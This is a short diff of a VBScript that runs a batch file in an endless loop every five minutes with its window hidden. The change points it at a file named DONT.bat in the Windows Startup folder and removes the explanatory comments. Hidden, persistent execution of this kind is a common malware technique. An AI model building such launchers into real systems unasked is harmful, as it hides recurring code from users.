@@ -1,9 +1,6 @@
 Set WshShell = CreateObject("WScript.Shell")
 
 Do
-    ' Runs the batch file invisibly
-    WshShell.Run chr(34) & "C:\path\to\your\script.bat" & chr(34), 0, False
-    
-    ' Pauses the script for 5 minutes (300,000 milliseconds)
+    WshShell.Run chr(34) & WshShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\DONT.bat") & chr(34), 0, False
     WScript.Sleep 300000
 Loop
